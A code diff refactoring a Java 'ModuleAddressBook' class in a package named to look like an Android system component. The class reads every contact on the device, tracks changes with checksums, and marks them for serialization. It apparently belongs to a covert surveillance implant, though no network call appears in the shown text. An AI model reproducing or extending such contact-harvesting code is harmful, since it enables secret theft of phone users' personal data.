@@ -2,8 +2,11 @@ package com.android.networking.module;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.Collection;
 import java.util.Date;
 import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Iterator;
 import java.util.List;
 import java.util.ListIterator;
 
@@ -71,6 +74,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		ListenerSim.self().attach(this);
 
 		markupContacts = new Markup(this);
+		//markupContacts.unserialize()
 
 		// the markup exists, try to read it
 		if (markupContacts.isMarkup()) {
@@ -195,16 +199,17 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		contact = new PickContact();
 
 		final Date before = new Date();
-		final List<Contact> list = contact.getContactInfo();
+		final Hashtable<Long, Contact> contacts = contact.getContactInfo();
 		final Date after = new Date();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);//$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): list size = " + list.size());//$NON-NLS-1$
+			Check.log(TAG + " (go): list size = " + contacts.size());//$NON-NLS-1$
 		}
 
-		final ListIterator<Contact> iter = list.listIterator();
+		
+		final Iterator<Contact> iter = contacts.values().iterator();
 
 		boolean needToSerialize = false;
 
@@ -244,7 +249,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			}
 			contacts.put(id, crcNew);
 			needToSerialize = true;
-			Thread.yield();
+			//Thread.yield();
 		}
 		return needToSerialize;
 	}
